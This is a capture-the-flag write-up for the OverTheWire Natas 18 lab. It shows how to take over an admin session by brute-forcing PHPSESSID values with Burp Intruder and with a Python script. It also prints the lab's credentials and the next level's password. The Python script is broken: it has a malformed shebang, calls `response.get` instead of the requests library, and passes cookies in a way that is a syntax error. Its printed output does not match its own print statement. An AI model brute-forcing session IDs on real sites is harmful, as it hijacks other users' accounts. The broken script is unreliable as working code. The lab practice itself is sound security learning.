@@ -1,0 +1,130 @@
+Title:Natas Level 17 → Level 18 (Session Manipulation/Hijacking)
+
+#Credentials
+Username: natas18
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+URL:      http://natas18.natas.labs.overthewire.org
+
+#Concept
+
+Session Hijacking/Manipulation is basically a vulnerability which involves stealing ones user session the session hijacking can be done by some header manipulation when intercepting the request packet, the session basically allows you to move freely into the website without the need of logging in everytime for example once the website asks you to authenticate itself and then if you switch to another page of that particular website then it won't ask you to login because the server has granted an ID to you by which the server no longer needs you to ask to authenticate.
+
+#Solution
+1.Login to the website using the credentials mentioned above.
+
+2.After logging in the website will display that you need to login as "admin" in order to see the password for the level 19 and  two input fields which are Username and password.
+
+->You can enter anything you want to 
+
+#At first I thought This was an SQL injection level but when I tried giving the malicious query it simply responded saying "you are logged in as a regular user"
+
+#Then I intercepted the request with the help of burpsuite and the read the contens of it, I saw in the cookies section that there was one label present called "PHPSESSID" which basically turned out to be the session ID
+
+3.Click on the "View Source Code" in which you can see the source code of the website and the working of it.
+
+#I saw that there are multiple functions which help in generating the session id but in my opinion this part of the code was looking more important than the rest, Ofcourse the other functions did help too but this was main code you could say
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+
+#In this part of the code it basically prints the credentials but with the condition it checks wheather in the Session part does it contain any admin label and its session id is equal to 1 {Thats what I thought in the beginning}, but try to give the session id as 1 it still responded the same way nothing changed.
+
+#Then I Saw that in the begining of the code It mentioned $maxid = 640 which means the maxid is upto 640 could it mean that in this numbers is the admin is logged in? if so which session id was admin logged in
+
+#Since I can't check manually I have to involve bruteforcing and there are 2 ways you can do it.
+
+***First_Way(Burpsuite)
+
+1.Open up burpsuite if not opened previously and intercept the request packet  of the login, after that send it to the intruder.
+
+2.Go the intruder section where you can see the intercepted packet, highlight the number of the "PHPSESSID" after highlighting it, it will look like this 
+
+# PHPSESSID = ~235~ { I tried it but it will add some special characters front and behind of that letters}
+
+3.You can select the type of payload and the type of attack
+
+->Choose the type of attack as "Sniper attack"
+
+-> In the payload section choose "numbers" add the starting and ending of the numbers as 1 and 640 respectively 
+
+**#note: If you don't have brupsuite professional this bruteforce will take a long time if you are using the "Community Edition" Enter the ending number around 250 or closer this will perform fast and you can the add rest of the numbers later.
+
+4. Press "Start the Attack"
+
+#After running the attack to know that you found an "admin session" you can look at the "Length" section after completion of the bruteforce you can filter the "length" section in descending order the number with the highest length will contain the session id of the "admin".
+
+5.You can see that the length of the "119" is "1363" ( This is in my case your case might be different)
+
+#After looking in the response of that request we can see that it says "You are an Admin" which contains password for the next level.
+
+6.Done
+
+
+***(Scripting)
+
+#You can also use scripting if you  want faster than  burpsuite community edition to try all the 640combination
+
+1. Open vim and paste this script.
+_______________________________________________________________________________________________________
+#!/usr/bin/env/python3
+
+import requests
+
+maxid = 640
+
+url="http://natas18.natas.labs.overthewire.org"
+username="natas18"
+password="6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+auth=(username,password)
+
+for s_id in range(1,maxid+1):
+	print(f"Trying PHPSESSID:{s_id}...")
+	cookies = {'PHPSESSID': str(s_id)}
+	response = response.get(url, auth=auth, cookies)
+
+	if "You are an admin" in response.text:
+		print(response.text)
+		break
+_______________________________________________________________________________________________________
+#The final output will be displayed as
+
+Trying with PHPSESSID = 119
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+
+2.Copy the password and store it for the next level.
+ 
+3.Done
+
+
+
+#Note:
+*To be honest the scripting was way more faster than the Burpsuite(Since it was community edition if it was professional then it would be amazing.)
+
+*Learned about the working of the session, creating of the session,destroying of the session, changing of the session variables.
+
+*learned more about the python scripting in response to web
